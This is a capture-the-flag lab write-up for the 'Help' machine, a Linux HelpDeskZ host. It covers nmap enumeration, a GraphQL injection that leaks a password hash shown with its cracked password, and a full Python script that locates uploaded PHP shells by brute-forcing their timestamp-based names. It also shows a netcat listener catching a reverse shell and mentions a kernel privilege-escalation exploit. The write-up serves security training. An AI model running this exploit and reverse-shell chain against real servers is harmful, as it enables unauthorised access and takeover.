# Help
### Info:
OS: Linux<br>
IP: 10.10.10.121<br>
Difficulty : Medium <br>
### Enumeration:

```nmap -sC -sV -oA nmap 10.10.10.121``` <br>

gives us the results : <br>
![alt text](https://i.imgur.com/3hzUbcu.png)
On port 3000 we found graphql api 

### Exploitation:
Graphql endpoint had a vulnerability which can be exploited as shown:
![alt text](https://i.imgur.com/esBZpdC.png)
Using this we get the `pass:5d3c93182bb20f07b994a7f617e99cff` which can be broken via hashes.org into `godhelpmeplz`
<br>
Now we can login at /support or the HelpDesk portal with those credentials. <br>
On searchsploit we get a exploit for helpdesk.
![alt text](https://i.imgur.com/djGauaF.png)
We can upload a php file and get the url via exploit.py 
<b> Exploit.py </b>
```
import hashlib
import time
import sys
import requests

print 'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit'

if len(sys.argv) < 4:
    print "Usage: {} [baseUrl] [nameOfUploadedFile]".format(sys.argv[0])
    sys.exit(1)

helpdeskzBaseUrl = sys.argv[1]
fileName = sys.argv[2]
extension = sys.argv[3]
date_time = '22.01.2019 13:49:19'
pattern = '%d.%m.%Y %H:%M:%S'
epochTime = int(time.mktime(time.strptime(date_time, pattern)))
#currentTime = int(time.time())
currentTime =  epochTime+70
print currentTime
for x in range(0, 500):
    plaintext = fileName + str(currentTime - x)
    md5hash = hashlib.md5(plaintext).hexdigest()

    url = helpdeskzBaseUrl+md5hash+extension
    response = requests.head(url)
    print 'looking for '+url
    if response.status_code == 200:
        print "found!"
        print url
        sys.exit(0)

print "Sorry, I did not find anything"
```
and running this script as :
```
root@kali:~/Desktop/boxes/Help# python exploit.py http://10.10.10.121/support/uploads/tickets/ phpshell.php .php
Helpdeskz v1.0.2 - Unauthenticated shell upload exploit
1548165029
looking for http://10.10.10.121/support/uploads/tickets/d4c85266e81912ce6a076dc5c4221b8a.php
looking for http://10.10.10.121/support/uploads/tickets/475c289fbce358193166cd4437264474.php
looking for http://10.10.10.121/support/uploads/tickets/79988be34d3e897d7f6202ffcefbc11c.php
looking for http://10.10.10.121/support/uploads/tickets/e42fb07d90c068fe0e992c8de02b62e4.php
found!
http://10.10.10.121/support/uploads/tickets/e42fb07d90c068fe0e992c8de02b62e4.php
```
get's us the location of the file. After running this script and listening on the port as :
```
root@kali:~/Desktop/boxes/Help# nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.16.16] from (UNKNOWN) [10.10.10.121] 45316
Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 07:13:03 up  9:03,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1000(help) gid=1000(help) groups=1000(help),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare)
/bin/sh: 0: can't access tty; job control turned off
$ locate user.txt
/home/help/user.txt
/usr/share/doc/fontconfig/fontconfig-user.txt.gz
```
get's us the user.
### Privilege Escaltion:
For root we check the kernel version via 
```
$ uname -r
4.4.0-116-generic
```
and finding the exploit for that specific version :
![alt text](https://i.imgur.com/wjByF1Y.png)
Running the exploit on the user machine get's us the root!

### Things learned:
Finding local files via time travel. <br>
Graphql end point injections. <br>
Local privesc via kernel version. <br>
